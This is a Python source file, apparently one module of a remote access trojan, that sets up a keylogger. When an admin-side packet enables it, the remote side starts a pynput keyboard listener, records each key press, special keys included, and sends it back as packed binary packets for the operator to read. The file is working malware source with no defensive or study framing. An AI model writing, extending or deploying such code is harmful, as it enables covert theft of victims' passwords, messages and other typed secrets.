import queue
import struct

from RATFunction.RATFunction import RATFunction, Side
from Constants import PACKET_SIZE

from pynput import keyboard


class MyLogging(RATFunction):

    # packet_id | is_special | key_str_size | key_str
    keystroke_packet_struct = struct.Struct(f"I I I {PACKET_SIZE - 4 - 4 - 4}s")

    # packet_id | enabled | _
    set_state_packet_struct = struct.Struct(f"I I {PACKET_SIZE - 4 - 4}s")

    def __init__(self, side, packet_queue):
        super().__init__(side, packet_queue)

        # remote vars
        self.keyboard_listener = None

        # admin vars
        self.received_keystroke_callback = lambda keystroke, is_special: ()

    def handle_packet_admin_side(self, data):
        packet_id, is_special, key_str_size, key_str = self.keystroke_packet_struct.unpack(data)
        key_str = key_str[:key_str_size].decode()

        self.received_keystroke_callback(key_str, bool(is_special))

    def handle_packet_remote_side(self, data):
        packet_id, enabled, _ = self.set_state_packet_struct.unpack(data)
        if enabled:
            self.keyboard_listener = keyboard.Listener(on_press=self._on_press)
            self.keyboard_listener.start()
        else:
            self.keyboard_listener.stop()

    def send_keystroke(self, keystroke: str, special=False):
        keystroke_bytes = keystroke.encode()
        packet = self.keystroke_packet_struct.pack(self.identifier(), 1 if special else 0,
                                                   len(keystroke_bytes), keystroke_bytes)
        self.packet_queue.put(packet)

    def identifier(self) -> int:
        return 3

    def send_set_state(self, state: bool):
        packet = self.set_state_packet_struct.pack(self.identifier(), 1 if state else 0, bytes())
        self.packet_queue.put(packet)

    def _on_press(self, key):
        try:
            self.send_keystroke(key.char)
        except AttributeError:
            self.send_keystroke(str(key), special=True)
